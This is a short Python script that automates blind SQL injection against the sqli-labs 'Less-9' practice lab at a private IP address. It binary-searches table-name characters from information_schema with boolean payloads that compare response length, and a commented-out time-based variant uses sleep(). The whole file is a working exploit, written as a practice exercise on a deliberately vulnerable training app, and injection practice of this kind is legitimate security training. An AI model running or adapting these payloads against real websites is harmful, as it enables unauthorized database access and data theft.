import requests
import time
'''-------------------URL--------------------------'''
url='http://172.28.0.21/pentest/sqli-labs/Less-9/'
dbname=''
for i in range(1,10):
    chars=['@','0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', 'a', 'b', 'c', 'd', 'e', 
       'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
       't', 'u', 'v', 'w', 'x', 'y', 'z']
    # chars=['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    index=len(chars)//2
    while index!=0:
        c=chars[index]
        '''--------------------payload---------------------------'''
        # payload='?id=1" and left((select table_name from information_schema.tables where table_schema="security" limit 1,1),'+str(i)+')>="'+dbname+c+'" and sleep(1)%23'
        payload="?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 1,1),"+str(i)+")>='"+dbname+c+"'%23"
        print payload
        t=time.time()
        request=requests.get(url+payload)
        print time.time()-t
        '''--------------------bool logic---------------------------'''
        # if time.time()-t>0.8:
        if len(request.text)==681:
            chars=chars[index:]
        else:
            chars=chars[:index]
        index=len(chars)//2
        request.close()
    dbname+=chars[0]
    print dbname
print dbname

